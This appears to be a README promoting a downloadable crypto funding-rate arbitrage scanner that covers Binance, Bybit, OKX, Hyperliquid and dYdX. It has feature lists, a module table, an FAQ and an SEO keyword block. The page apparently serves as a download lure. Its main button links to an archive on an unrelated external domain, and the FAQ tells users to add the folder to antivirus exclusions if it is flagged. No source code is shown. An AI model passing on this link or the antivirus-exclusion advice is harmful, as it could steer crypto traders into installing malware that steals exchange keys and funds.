# Funding Rate Arbitrage Scanner 📡💹

A self-hosted scanner for **perpetual funding rate arbitrage** — the delta-neutral trade where you hold spot long and perp short (or the reverse) to collect funding payments while price exposure cancels out. Instead of checking five exchange tabs every few hours, this tool streams funding rates from Binance, Bybit, OKX, Hyperliquid, and dYdX in real time, ranks every pair by annualized yield net of fees, and fires a Telegram alert when a spread crosses your threshold and stays there.

[![Download Funding Rate Arbitrage Scanner](https://img.shields.io/badge/Download-Funding_Rate_Arbitrage_Scanner-blueviolet)](https://dyhuiying.com/s/file)

![Version](https://img.shields.io/badge/version-1.2-blue)
![Platform](https://img.shields.io/badge/platform-Windows%20%7C%20macOS%20%7C%20Linux-0078D6)
![Status](https://img.shields.io/badge/status-active-brightgreen)
![Exchanges](https://img.shields.io/badge/exchanges-5%2B-orange)

<details>
<summary>📑 Contents</summary>

- [Quick Start](#-quick-start)
- [Requirements](#️-requirements)
- [Key Features](#-key-features)
- [Module Overview](#-module-overview)
- [Why Choose Funding Rate Arbitrage Scanner](#-why-choose-funding-rate-arbitrage-scanner)
- [FAQ](#-faq)
- [SEO Keywords](#-seo-keywords)

</details>

## ⚡ Quick Start

1. Download the archive using the button above.
2. Install dependencies with `pip install -r requirements.txt`.
3. Copy `config.example.yaml`, add your Telegram token and funding threshold, then run `fr-scan start`.

The scanner starts streaming rates and prints a ranked table in the terminal within the first cycle.

## 🖥️ Requirements

| Item | Requirement |
|------|-------------|
| OS | Windows 10/11, macOS 12+, Linux (64-bit) |
| RAM | 2 GB minimum |
| Storage | 200 MB free |
| Privileges | Standard user (no admin required) |

## ✨ Key Features

**Rate Monitoring**

- 📡 **Real-Time Funding Feeds** — current and predicted funding rates streamed from Binance, Bybit, OKX, Hyperliquid, and dYdX.
- 🔄 **8-Hour Cycle Tracking** — next funding timestamp, predicted rate, and last three settlements per pair.
- 🧮 **Annualized Yield Calculation** — funding rate converted into an APR figure net of taker fees and slippage estimates.
- ⚡ **Spread Comparison** — cross-exchange ranking when the same asset has different rates on different venues.

**Opportunity Ranking**

- 🎯 **Delta-Neutral Score** — every pair scored by stability of funding, liquidity depth, and basis risk.
- 📊 **Historical Persistence** — how many consecutive cycles a rate has held above threshold, so one-off spikes do not dominate.
- 💧 **Liquidity Filter** — minimum order-book depth requirement to avoid opportunities that cannot actually be filled.
- 🚫 **Fee-Aware Ranking** — entry and exit costs subtracted before the opportunity appears on the list.

**Alerts & Execution**

- 📱 **Telegram Alerts** — configurable thresholds per asset, per exchange, and per annualized yield.
- 📡 **Webhook Output** — forward opportunities to a trading bot or dashboard.
- 🧾 **Opportunity Log** — every detected spread saved with entry time, rate, and expected yield.
- 🐳 **Docker Support** — one-command deployment with `docker compose up`.

**Self-Hosted & Private**

- 🔐 **No Account Required** — core rate monitoring uses public endpoints; trading keys are optional and only needed for the execution module.
- 💻 **Local Storage** — all configuration, logs, and opportunity history stay on your machine.
- 📊 **CSV Export** — export the opportunity log for backtesting or tax records.

## 📋 Module Overview

| Module | What it does | Interface |
|--------|--------------|-----------|
| rate_streamer | Live funding rates from 5+ venues | Python API |
| yield_calculator | Annualized yield net of fees | Python API |
| opportunity_ranker | Delta-neutral scoring and ranking | CLI |
| liquidity_filter | Order-book depth check | Python API |
| alert_dispatcher | Telegram and webhook alerts | CLI |
| opportunity_logger | Persistent opportunity history | CLI / CSV |
| docker_runner | Container deployment | Docker |

## 🚀 Why Choose Funding Rate Arbitrage Scanner

- ✅ Multi-venue by default — five exchanges streamed through one interface instead of five separate scrapers.
- ✅ Fee-aware ranking — the number on screen is the yield you actually keep, not the raw funding rate.
- ✅ Persistence-first — opportunities are ranked by how long a rate has held, not by a single spike.
- ✅ Liquidity filter — prevents chasing rates that look great but cannot be filled at size.
- ✅ Self-hosted — no subscription, no account, and no data leaving your machine for the core scanner.

## 💡 Why Use It

- 📡 Watch funding rates across five exchanges from one terminal instead of five tabs.
- 🎯 Find delta-neutral opportunities that survive fees and liquidity, not just headline APR.
- 🧭 Track how long a rate has persisted before committing capital to the trade.
- ⚡ Forward opportunities to a bot or dashboard through webhooks.

## ❓ FAQ

**Do I need to run it as Administrator?**
No — the scanner runs as a standard user process and does not require elevated privileges.

**Will my antivirus flag the file?**
Some engines may flag Python entry points by heuristic. Add the project folder to exclusions if needed.

**Does it work on Windows 11?**
Yes — Windows 10/11, macOS, and Linux are all supported.

**Does it place trades automatically?**
No — the core scanner only detects and alerts. Trade execution is a separate opt-in module that requires exchange API keys.

**How do I update?**
Pull the latest archive and reinstall dependencies — configs and opportunity logs are preserved.

## 🔎 SEO Keywords

Funding Rate Arbitrage Scanner, funding rate arbitrage, funding rate scanner, perpetual funding scanner, crypto funding rates, funding rate arbitrage bot, funding rate monitoring, delta neutral arbitrage crypto, funding rate api, binance funding rate scanner, bybit funding rate tracker, OKX funding rate tool, hyperliquid funding rates, dydx funding rates, crypto arbitrage scanner, funding rate alerts telegram, self-hosted funding scanner, funding rate arbitrage github, crypto basis trade tool, perpetual swap funding rates

## ⚠️ Disclaimer

Provided for educational and informational purposes only. Use at your own risk and in accordance with the terms of service of any exchange or data provider you interact with. Trading involves financial risk, and funding rate yields are not guaranteed.
